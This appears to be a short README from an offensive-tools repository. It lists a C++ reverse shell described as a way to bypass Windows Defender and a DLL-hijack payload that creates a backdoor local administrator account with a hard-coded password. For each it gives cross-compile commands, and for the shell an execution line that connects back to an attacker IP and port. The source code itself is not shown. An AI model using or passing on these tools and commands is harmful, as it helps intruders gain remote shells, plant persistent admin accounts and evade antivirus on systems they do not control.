### revshell.cpp
Simple C++ reverse shell, can be used to bypass Windows Defender if we want to get a simple reverse shell from the target.
- Compile in linux with: `x86_64-w64-mingw32-g++ -o rev.exe rev.cpp -lws2_32 -static-libgcc -static-libstdc++`
- Execute: `rev.exe 192.168.45.195 9001`

### newadmin.cpp
Source: https://github.com/gustanini/DLL-Hijack-POC/tree/main 

DLL that will create a new local admin with the username `amit` and the password `Password123!`. 
- Compile in linux with: `x86_64-w64-mingw32-gcc -shared -o backdoor.dll newadmin.cpp` 
